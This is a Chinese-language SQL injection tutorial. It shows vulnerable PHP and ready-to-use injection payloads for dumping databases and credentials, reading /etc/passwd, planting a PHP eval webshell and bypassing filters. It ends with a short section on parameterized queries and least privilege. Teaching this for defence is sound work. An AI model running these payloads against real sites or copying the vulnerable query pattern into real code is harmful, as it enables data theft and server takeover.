---
title: SQL 注入入门与进阶
date: 2026-06-18 20:55:21
tags:
- SQL
- Web 安全
- 注入
---

## 什么是 SQL 注入

SQL 注入是把用户输入直接拼接到 SQL 语句中，导致攻击者可以操纵查询逻辑。

```php
// 存在注入的代码
$sql = "SELECT * FROM users WHERE username = '{$_POST['user']}' AND password = '{$_POST['pass']}'";
$result = mysqli_query($conn, $sql);
```

## 注入类型区分

### 数字型 vs 字符型

```sql
-- 数字型：直接传数字
?id=1 and 1=1  -- 正常
?id=1 and 1=2  -- 异常，说明存在注入

-- 字符型：需要闭合引号
?id=1' and '1'='1  -- 正常
?id=1' and '1'='2  -- 异常
```

### 报错 vs 布尔 vs 时间

```sql
-- 报错注入：数据库错误信息直接回显
?id=1' and extractvalue(1, concat(0x7e, (select database()))) --+

-- 布尔盲注：页面有 True/False 差异
?id=1' and length(database())=8 --+

-- 时间盲注：无回显时用延时判断
?id=1' and if(ascii(substr(database(),1,1))>115, sleep(3), 0) --+
```

## 联合查询（Union）

```sql
-- 先测列数
?id=1' order by 3 --+
?id=1' order by 4 --+  -> 报错，说明 3 列

-- 联合查询查数据
?id=-1' union select 1,2,3 --+
-- 页面显示 2 和 3，说明回显位是第 2、3 列

-- 爆库
?id=-1' union select 1,database(),version() --+

-- 爆表
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

-- 爆字段
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+

-- 脱数据
?id=-1' union select 1,group_concat(username,0x7e,password),3 from users --+
```

## 读文件 / 写 Webshell

```sql
-- 读文件（需要 file 权限）
?id=-1' union select 1,load_file('/etc/passwd'),3 --+

-- 写 Webshell
?id=1' union select 1,'<?php eval($_POST[1]);?>',3 into outfile '/var/www/html/shell.php' --+
```

## 常用 Bypass 技巧

```sql
-- 空格被拦 → /**/ 代替
?id=1'/**/union/**/select/**/1,2,3--+

-- 关键字被拦 → 双写
?id=-1' uniunionon selselectect 1,2,3--+

-- 逗号被拦 → join 绕过
?id=-1' union select * from (select 1)a join (select 2)b join (select 3)c --+

-- 等号被拦 → like
?id=1' and username like 'admin' --+

-- 引号被拦 → 十六进制
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x74657374 --+
```

## 防御

```php
// 方案一：参数化查询（推荐）
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$_POST['user'], $_POST['pass']]);

// 方案二：白名单验证
if (!ctype_digit($_GET['id'])) die('Invalid id');

// 方案三：最小权限原则
// 数据库用户只给 SELECT 权限，不给 FILE、DROP 等高危权限
```
